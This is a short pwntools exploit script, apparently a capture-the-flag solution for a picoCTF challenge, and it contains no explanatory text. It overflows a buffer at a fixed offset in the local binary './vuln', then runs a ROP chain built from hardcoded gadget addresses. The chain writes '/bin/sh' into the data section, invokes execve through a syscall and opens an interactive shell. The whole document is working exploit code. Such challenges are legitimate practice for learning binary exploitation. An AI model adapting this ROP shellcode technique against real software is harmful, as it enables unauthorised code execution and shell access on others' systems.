from pwn import *

elf = ELF("./vuln")

datastartadd = elf.symbols["data_start"]

offset = 28
io = elf.process()
#io = remote("saturn.picoctf.net", 59840)
rop = ROP(elf)

eaxadd = 0x080b073a
edx_ebxadd = 0x080583b9
ecxadd = 0x08049e29
ebxadd = 0x08049022
moveax_edxadd = 0x0809e5c8
syscalladd = 0x0804a3c2

rop.raw([eaxadd, datastartadd, edx_ebxadd, "/bin", "junk", moveax_edxadd])
rop.raw([eaxadd, datastartadd + 0x4, edx_ebxadd, "/sh\x00", "junk", moveax_edxadd])
rop.raw([edx_ebxadd, 0x0, datastartadd, ecxadd, 0x0, eaxadd, 0xb, syscalladd])

payload = flat({
  offset: rop.chain()
})

#print(payload)
io.sendlineafter(b'!', payload)
io.interactive()
